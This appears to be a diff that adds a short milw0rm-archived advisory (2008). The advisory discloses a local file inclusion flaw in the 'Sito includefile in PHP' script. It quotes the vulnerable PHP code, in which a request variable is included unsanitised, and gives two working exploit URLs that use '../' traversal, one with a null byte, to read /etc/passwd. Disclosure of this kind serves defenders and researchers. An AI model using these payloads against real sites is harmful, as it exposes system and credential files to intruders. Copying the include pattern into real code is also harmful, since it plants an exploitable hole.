@@ -1,0 +1,24 @@
+# ------------------------------------------------------------
+# Sito includefile in PHP Local File Inclusion Vulnerabilities
+# ------------------------------------------------------------
+# Discovered By StAkeR[at]hotmail[dot]it
+# Download On http://www.niclor.net/prodotti/include_Sito_PHP/include_Sito_PHP.zip
+# -----------------------------------------------------------
+
+# File (includefile.php)
+# Register Globals On
+1. <? 
+2. if (($page != "") or ($page == "home")) {
+3.    include "pagine/$page_file";
+4. } else {
+5.    include "pagine/home.php";
+6. }
+7. ?>
+
+# includefile.php?page=athos&page_file=../../../../../../etc/passwd
+
+# File (index.php)
+# Magic_Quotes_GPC
+# index.php?id=../../../../../etc/passwd%00 
+
+# milw0rm.com [2008-11-04]
